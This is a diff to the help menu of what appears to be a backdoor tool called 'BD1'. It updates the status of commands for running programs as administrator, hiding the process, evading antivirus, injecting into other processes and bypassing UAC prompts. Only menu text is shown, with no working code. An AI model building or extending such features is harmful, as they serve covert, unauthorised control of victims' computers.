@@ -268,14 +268,12 @@ Available Commands:
     cd <path>             - Change working directory (OK but still lose stable)
 
   Evade & Hide:
-    runas <program> [args] - Run program as administrator (In processing)
-    hide                   - Hide BD1 process (In processing)
+    runas <program> [args] - Run program as administrator (OK)
+    hide (Auto)            - Hide BD1 process (OK)
     evade                  - Apply antivirus evasion techniques (In processing)
-    inject [pid]          - Inject into another process (In processing)
 
-  UAC Commands:
-    bypassuac            - Bypass UAC for current process (In processing)
-    bypassuac <command>  - Bypass UAC and run specific command (In processing)
+  BypassUAC Commands:
+    silentrun <program>  - Bypass UAC and run program without UAC prompt (In processing)
 
 """
         print(help_text)
